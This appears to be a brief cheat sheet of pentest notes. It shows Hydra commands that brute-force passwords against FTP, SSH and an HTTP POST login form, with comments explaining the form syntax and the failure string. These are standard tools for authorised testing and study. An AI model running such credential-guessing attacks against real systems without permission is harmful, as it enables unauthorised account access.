# Basic usage

```sh
hydra -l user -P passlist.txt ftp://$IP 
hydra -l username -P passlist.txt $IP ssh -t 4
hydra -l username -P passlist.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
# http-post-form -> type of form (post)
# ^USER^ -> to use the username
# ^PASS^ -> list of passwords supplied
# incorrect -> if login failed, "incorrect" appears on the page